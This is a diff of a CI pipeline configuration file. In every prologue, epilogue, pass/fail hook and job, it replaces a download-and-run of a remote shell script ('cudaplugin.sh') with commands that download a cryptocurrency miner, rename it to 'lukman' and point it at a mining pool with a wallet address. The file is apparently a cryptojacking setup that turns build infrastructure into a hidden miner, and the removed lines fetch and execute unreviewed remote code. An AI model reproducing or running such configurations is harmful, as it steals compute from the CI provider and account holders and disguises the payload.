@@ -17,25 +17,29 @@ blocks:
             - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       prologue:
         commands:
-          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-          - chmod u+x cudaplugin.sh
-          - ./cudaplugin.sh
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       epilogue:
         always:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_pass:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_fail:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
   - name: 'Block #2'
     dependencies:
       - 'Block #1'
@@ -74,62 +78,72 @@ blocks:
     task:
       prologue:
         commands:
-          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-          - chmod u+x cudaplugin.sh
-          - ./cudaplugin.sh
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       epilogue:
         always:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_pass:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_fail:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
   - name: 'Block #4'
     dependencies:
       - 'Block #3'
     task:
       prologue:
         commands:
-          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-          - chmod u+x cudaplugin.sh
-          - ./cudaplugin.sh
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       epilogue:
         always:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_pass:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_fail:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
   - name: 'Block #5'
     dependencies:
       - 'Block #1'
@@ -139,28 +153,33 @@ blocks:
     task:
       prologue:
         commands:
-          - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-          - chmod u+x cudaplugin.sh
-          - ./cudaplugin.sh
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 lukman
+          - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       epilogue:
         always:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_pass:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
         on_fail:
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - ./cudaplugin.sh
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 lukman
+            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
